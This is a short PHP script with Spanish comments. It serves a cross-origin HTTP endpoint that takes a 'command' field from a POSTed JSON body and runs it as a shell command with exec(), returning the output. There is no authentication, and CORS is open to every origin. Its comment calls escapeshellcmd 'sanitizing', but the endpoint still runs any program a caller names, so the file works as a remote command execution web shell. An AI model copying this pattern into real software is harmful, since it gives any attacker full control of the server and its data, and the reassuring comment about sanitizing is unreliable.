<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

function return_response($status, $statusMessage, $data) {
    header("HTTP/1.1 $status $statusMessage");
    header("Content-Type: application/json; charset=UTF-8");
    echo json_encode($data);
}

// Responder a solicitudes OPTIONS preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Verificar el método de solicitud
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $bodyRequest = json_decode(file_get_contents("php://input"), true);
    $command = escapeshellcmd($bodyRequest['command'] ?? '');  // Sanitizar el comando

    if (empty($command)) {
        return_response(400, "Bad Request", ["error" => "Comando no especificado"]);
        exit();
    }

    // Ejecutar el comando y capturar la salida
    $output = [];
    $return_var = null;
    exec($command . " 2>&1", $output, $return_var);

    $response = [
        "output" => $output,
        "status" => $return_var === 0 ? "success" : "error"
    ];

    return_response(200, "OK", $response);
} else {
    return_response(405, "Method Not Allowed", null);
}
?>
